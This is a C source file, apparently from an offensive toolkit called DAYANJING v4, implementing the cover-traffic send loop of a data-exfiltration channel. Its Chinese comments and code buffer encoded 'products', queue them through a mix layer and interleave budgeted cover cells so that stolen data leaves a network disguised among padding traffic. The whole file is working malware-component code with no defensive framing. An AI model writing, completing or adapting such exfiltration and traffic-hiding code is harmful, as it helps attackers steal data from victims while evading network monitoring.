/*
 * DAYANJING v4 — 21_exfil/src/link_cover.c
 *
 * 自适应覆盖流量接入真实数据面发送循环。设计说明见 exfil_link_cover.h。
 *
 * ====================================================================
 * 为什么是「提交 + 泵送」而不是「一次入队」
 * ====================================================================
 * mix 队列容量 P2P_MIX_MAXQ = 64，而一条大产物可编码出 204 个信元
 * （100 KB 载荷）。若要求"一次 enqueue 整批"，则必然在入到第 64 个时
 * 返回 FULL —— 一批发不出去，接收端永远等不到 FIN，链路直接挂死。
 * 这是首版实测撞出来的死锁，不是理论问题。
 *
 * 正确语义是**入队与出片交替**：
 *   submit  把整批编码到本层持有的缓冲（不入队）
 *   pump    先把缓冲里能装下的信元入队，再出一片
 *   循环 pump 直到「缓冲排空 且 队列排空」
 *
 * 于是队列容量只影响吞吐粒度，不影响一批能否发完；背压仍然存在
 * （队列满时本次少入几个，下一片继续），但不会丢信元、不会破坏 FIN。
 */

#include "exfil_link_cover.h"
#include "exfil_link.h"

#include <stdlib.h>
#include <string.h>

/* 默认片长与每片数据上限（未被 init 显式指定时） */
#define LC_DEFAULT_PERIOD_MS   50u
#define LC_DEFAULT_BATCH       32u

const char *exfil_link_cover_errstr(int e) {
    switch (e) {
        case EXF_LC_OK:        return "ok";
        case EXF_LC_ERR_ARG:   return "invalid argument";
        case EXF_LC_ERR_FULL:  return "mix queue full (backpressure)";
        case EXF_LC_ERR_IO:    return "io failure";
        case EXF_LC_ERR_TICK:  return "too many flush ticks";
        case EXF_LC_ERR_NOMEM: return "no memory";
        default:               return "unknown";
    }
}

int exfil_link_cover_init(exfil_link_cover_t *lc, uint32_t seed,
                          uint32_t period_ms, uint32_t batch,
                          uint32_t profile, uint32_t budget_bpm,
                          uint32_t now_ms) {
    if (!lc) return EXF_LC_ERR_ARG;

    memset(lc, 0, sizeof(*lc));

    if (period_ms == 0) period_ms = LC_DEFAULT_PERIOD_MS;
    if (batch == 0)     batch = LC_DEFAULT_BATCH;

    if (p2p_mix_init(&lc->mx, seed, period_ms, batch, now_ms) != P2P_MIX_OK)
        return EXF_LC_ERR_ARG;

    if (p2p_cover_init(&lc->cov, profile, budget_bpm,
                       (uint64_t)now_ms * 1000ull) != P2P_COVER_OK)
        return EXF_LC_ERR_ARG;

    lc->period_ms = period_ms;
    lc->batch = batch;
    lc->inited = 1;
    return EXF_LC_OK;
}

/* 释放提交缓冲（密文，仍需清零） */
void exfil_link_cover_wipe(exfil_link_cover_t *lc) {
    if (!lc) return;
    if (lc->enc) {
        memset(lc->enc, 0, lc->enc_bytes);
        free(lc->enc);
        lc->enc = NULL;
    }
    lc->enc_n = 0;
    lc->enc_i = 0;
    lc->enc_bytes = 0;
    lc->inited = 0;
}

int exfil_link_cover_set_profile(exfil_link_cover_t *lc, uint32_t profile) {
    if (!lc || !lc->inited) return EXF_LC_ERR_ARG;
    return (p2p_cover_set_profile(&lc->cov, profile) == P2P_COVER_OK)
               ? EXF_LC_OK : EXF_LC_ERR_ARG;
}

int exfil_link_cover_set_cost(exfil_link_cover_t *lc, uint32_t bytes_per_cell) {
    if (!lc || !lc->inited) return EXF_LC_ERR_ARG;
    return (p2p_cover_set_measured_cost(&lc->cov, bytes_per_cell)
                == P2P_COVER_OK) ? EXF_LC_OK : EXF_LC_ERR_ARG;
}

int exfil_link_cover_set_budget(exfil_link_cover_t *lc, uint32_t budget_bpm) {
    if (!lc || !lc->inited) return EXF_LC_ERR_ARG;
    return (p2p_cover_set_budget(&lc->cov, budget_bpm) == P2P_COVER_OK)
               ? EXF_LC_OK : EXF_LC_ERR_ARG;
}

int exfil_link_cover_set_bounds(exfil_link_cover_t *lc, uint32_t min_per_min,
                                uint32_t max_per_min) {
    if (!lc || !lc->inited) return EXF_LC_ERR_ARG;
    return (p2p_cover_set_bounds(&lc->cov, min_per_min, max_per_min)
                == P2P_COVER_OK) ? EXF_LC_OK : EXF_LC_ERR_ARG;
}

/*
 * 提交一条产物：编码成信元流存于本层缓冲，**不入队**。
 * 同一时刻只持有一批 —— 重复提交会覆盖未发完的批次，调用方应先 pump 完。
 */
int exfil_link_cover_submit(exfil_chan_t *ch, exfil_link_cover_t *lc,
                            const exfil_rec_t *r, uint32_t stream,
                            size_t *out_cells) {
    if (!ch || !lc || !r || !out_cells) return EXF_LC_ERR_ARG;
    if (!lc->inited) return EXF_LC_ERR_ARG;

    size_t n = 0;
    if (exfil_send_cells(r, &n) != EXF_OK) return EXF_LC_ERR_ARG;
    if (n == 0 || n > EXF_LINKCOVER_MAX_CELLS) return EXF_LC_ERR_ARG;

    size_t need = n * P2P_CELL_WIRE;
    uint8_t *buf = (uint8_t *)malloc(need);
    if (!buf) return EXF_LC_ERR_NOMEM;

    size_t got = 0;
    int rc = exfil_chan_send(ch, r, buf, need, &got);
    if (rc != EXF_OK || got == 0 || got > n) {
        memset(buf, 0, need);
        free(buf);
        return (rc != EXF_OK) ? rc : EXF_LC_ERR_ARG;
    }

    /* 替换旧缓冲（上一批若未发完，此处清零释放） */
    if (lc->enc) {
        memset(lc->enc, 0, lc->enc_bytes);
        free(lc->enc);
    }
    lc->enc = buf;
    lc->enc_bytes = need;
    lc->enc_n = got;
    lc->enc_i = 0;
    lc->stream = stream;

    *out_cells = got;
    return EXF_LC_OK;
}

/*
 * 泵送一次：先把缓冲里能装下的信元入队（受 P2P_MIX_MAXQ 背压约束），
 * 再出一片并写出。返回 EXF_LC_OK 表示本片已发出。
 */
int exfil_link_cover_pump(exfil_chan_t *ch, exfil_link_cover_t *lc,
                          int fd, uint32_t now_ms,
                          size_t *out_real, size_t *out_cover) {
    if (!ch || !lc || fd < 0) return EXF_LC_ERR_ARG;
    if (!lc->inited) return EXF_LC_ERR_ARG;

    /* 1) 入队：装到队列满为止，剩余留到下一片（背压，不丢弃） */
    while (lc->enc_i < lc->enc_n) {
        int e = p2p_mix_enqueue(&lc->mx, lc->stream,
                                lc->enc + lc->enc_i * P2P_CELL_WIRE);
        if (e != P2P_MIX_OK) break;
        lc->enc_i++;
    }

    /* 2) 出片：数据优先、覆盖按预算补（覆盖用同一个 cell 上下文封装） */
    p2p_mix_out_t out[P2P_MIX_MAX_BATCH + 64];
    size_t n_out = 0, n_r = 0, n_c = 0;

    int rc = p2p_mix_flush_adaptive(&lc->mx, &lc->cov, now_ms, &ch->cell,
                                    out, P2P_MIX_MAX_BATCH + 64,
                                    &n_out, &n_r, &n_c);
    if (rc != P2P_MIX_OK) return rc;

    for (size_t i = 0; i < n_out; i++) {
        if (exfil_link_write_all(fd, out[i].cell, P2P_CELL_WIRE) != 0)
            return EXF_LC_ERR_IO;
        lc->bytes_sent += P2P_CELL_WIRE;
        lc->cells_sent++;
    }
    lc->cover_sent += n_c;

    if (out_real)  *out_real  = n_r;
    if (out_cover) *out_cover = n_c;
    return EXF_LC_OK;
}

int exfil_link_cover_idle(exfil_chan_t *ch, exfil_link_cover_t *lc,
                          int fd, uint32_t now_ms, size_t *out_cover) {
    /* 无待发数据时 pump 只产出覆盖信元 */
    return exfil_link_cover_pump(ch, lc, fd, now_ms, NULL, out_cover);
}

int exfil_link_send_adaptive(exfil_chan_t *ch, exfil_link_cover_t *lc,
                             const exfil_rec_t *r, int fd, uint32_t now_ms,
                             uint32_t stream,
                             size_t *out_real, size_t *out_cover) {
    if (!ch || !lc || !r || fd < 0) return EXF_LC_ERR_ARG;

    size_t n = 0;
    int rc = exfil_link_cover_submit(ch, lc, r, stream, &n);
    if (rc != EXF_LC_OK) return rc;

    size_t tr = 0, tc = 0;
    uint32_t t = now_ms;

    for (unsigned i = 0; i < EXF_LINKCOVER_MAX_TICKS; i++) {
        size_t r2 = 0, c2 = 0;
        rc = exfil_link_cover_pump(ch, lc, fd, t, &r2, &c2);
        if (rc != EXF_LC_OK) return rc;
        tr += r2;
        tc += c2;
        /* 缓冲排空且队列排空 -> 本批发完 */
        if (lc->enc_i >= lc->enc_n && lc->mx.n == 0) break;
        t += lc->period_ms;
    }

    if (lc->enc_i < lc->enc_n || lc->mx.n != 0) return EXF_LC_ERR_TICK;

    if (out_real)  *out_real  = tr;
    if (out_cover) *out_cover = tc;
    return EXF_LC_OK;
}

uint32_t exfil_link_cover_rate(const exfil_link_cover_t *lc) {
    if (!lc || !lc->inited) return 0;
    return p2p_cover_rate((p2p_cover_t *)&lc->cov);
}

size_t exfil_link_cover_pending(const exfil_link_cover_t *lc) {
    if (!lc || !lc->inited) return 0;
    size_t q = (lc->mx.n > 0) ? (size_t)lc->mx.n : 0;
    size_t e = (lc->enc_n > lc->enc_i) ? (lc->enc_n - lc->enc_i) : 0;
    return q + e;
}

uint32_t exfil_link_cover_projected_bpm(const exfil_link_cover_t *lc) {
    if (!lc || !lc->inited) return 0;
    return p2p_cover_projected_bytes_per_min((p2p_cover_t *)&lc->cov);
}
